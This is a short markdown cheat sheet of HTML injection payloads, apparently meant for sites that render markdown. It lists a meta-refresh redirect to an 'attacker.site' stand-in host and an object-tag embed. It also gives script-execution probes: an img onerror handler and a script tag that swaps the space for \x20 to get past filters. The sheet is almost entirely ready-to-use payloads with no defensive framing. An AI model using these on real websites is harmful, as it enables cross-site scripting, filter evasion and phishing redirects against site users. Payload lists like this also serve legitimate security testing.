## Redirect

### Meta <i> (useful for websites that supports only few markdown features) </i>
```html
<meta http-equiv="refresh" content='0; url=http://attacker.site/'>
```

### Object
```html
<object data="/path" type="text/html"></object>
```
<br>

## Execution

### Img
```html
<img src=x onerror="something();"/>
```

### No Space
```html
<script\x20type="text/javascript">javascript:alert(1);</script>
```
